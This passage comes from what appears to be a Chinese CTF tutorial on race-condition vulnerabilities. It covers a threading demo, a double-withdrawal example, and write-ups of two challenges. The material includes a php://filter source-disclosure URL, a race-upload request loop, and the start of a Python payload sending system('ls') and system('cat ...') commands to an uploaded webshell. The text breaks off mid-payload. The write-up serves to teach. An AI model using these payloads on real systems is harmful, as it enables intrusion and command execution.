punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>threads<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        threads<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Finally, The COUNT is %d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>COUNT<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#######################===== 输出结果</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#部分结果为：</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        ……</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9989</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9972</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9990</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9973</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9991</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9974</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9992</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9975</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9993</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9976</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9994</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9977</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9995</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9978</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9996</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9979</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9997</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9980</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9998</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9981</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9999</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9982</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Finally<span class=\"token punctuation\">,</span> The COUNT <span class=\"token keyword\">is</span> <span class=\"token number\">9983</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>Process finished <span class=\"token keyword\">with</span> exit code <span class=\"token number\">0</span></pre></td></tr></table></figure><p>按照我们的预想，结果应该都是 10000，但是发现结果可能存在非预期解，并且出现非预期的概率还挺大的。</p>\n<p>这是什么原因呢？</p>\n<p>原因就在于我们没有对变量 COUNT 做同步制约，导致可能 Thread-7 在读 COUNT, 还没来得及更改 COUNT,Thread-8 抢夺资源，也来读 COUNT, 并且将 COUNT 修改为它读的结果 + 1，由此出现非预期。</p>\n<p>同样的，WEB 应用程序因为要为很多用户服务，势必要采用多线程，但是，如果种种原因导致线程间的同步机制没处理好，那么也就会导致非预期和条件竞争的漏洞。</p>\n<h3 id=\"例一金额提现\"><a class=\"anchor\" href=\"#例一金额提现\">#</a> 例一：金额提现</h3>\n<p>假设现有一个用户在系统中共有 2000 元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现 2000 元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现 2000 元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为 - 2000。而这产生的后果将会是平台多向该用户付出 2000 元</p>\n<h3 id=\"例二moctf里的一道题\"><a class=\"anchor\" href=\"#例二moctf里的一道题\">#</a> 例二：moctf 里的一道题</h3>\n<p>打开网址后一直打开的是 index2.php 修改为 index.php 后发现还是会跳转到 index2 抓包修改 index.php。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>发现 index.php 是一个 302 网页，因此就可以看到这里存在的一个文件 uploadsomething.php。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>随便填写文件名下面写入代码，再进行提交。</p>\n<p>访问后</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>因此这里就需要用到条件竞争，不断的向网站发送请求，然后边发送边访问。</p>\n<p>写入一个 py 文件一直发 requests 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://119.23.73.3:5006/web2/uploads/b106f91010a3789acab1f27a00d67570052a7921/1.php\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image004.png\" alt=\"\" /></p>\n<h3 id=\"例三xman-easy-gallery\"><a class=\"anchor\" href=\"#例三xman-easy-gallery\">#</a> 例三：XMAN-Easy Gallery</h3>\n<p>伪协议读取代码<br />\n <code>http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php</code></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh-CN<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$error</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$tmpName</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$size</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$type</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$name1</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name1</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\".gif\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$name1</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\".jpg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hehe\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"image/jpeg\"</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$type</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"image/gif\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token function\">mime_content_type</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language='JavaScript'>alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'image/jpeg'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                    <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> @<span class=\"token function\">imagecreatefromjpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                      <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatetruecolor</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                      <span class=\"token variable\">$bg</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                      <span class=\"token variable\">$text_color</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                      <span class=\"token function\">imagefilledrectangle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$bg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                      <span class=\"token function\">imagestring</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Error loading image\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_color</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                        <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                        <span class=\"token variable\">$new_rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                        <span class=\"token function\">imagejpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$new_rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'image/gif'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                    <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> @<span class=\"token function\">imagecreatefromgif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                      <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatetruecolor</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                      <span class=\"token variable\">$bg</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                      <span class=\"token variable\">$text_color</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                      <span class=\"token function\">imagefilledrectangle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$bg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                      <span class=\"token function\">imagestring</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Error loading image\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_color</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                        <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                        <span class=\"token variable\">$new_rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                        <span class=\"token function\">imagegif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$new_rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"图片ID：\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ERROR\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre> <span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>首先是验证上传的文件是否为图片格式，如果上传了正确的图片，imagecreatefromjpeg () 返回图像资源，文件名更换为新的时间戳，用新的文件路径 newrootpath 输 出 图 片 ， 最 后 删 除 原文件 unlink (new_rootpath) 输出图片，最后删除原文件 unlink; 如果上传了不正确的图片，不会更换新的文件路径，最后还要删除源文件 unlink ($rootpath); 上传过程中存在一个延时函数 sleep (5)，所以上传的文件即使验证不成功也有 5 秒钟的时间存在。</p>\n<p>python 的 payload。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>data0<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"phpinfo();\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>data1<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('ls');\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>data2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('cat 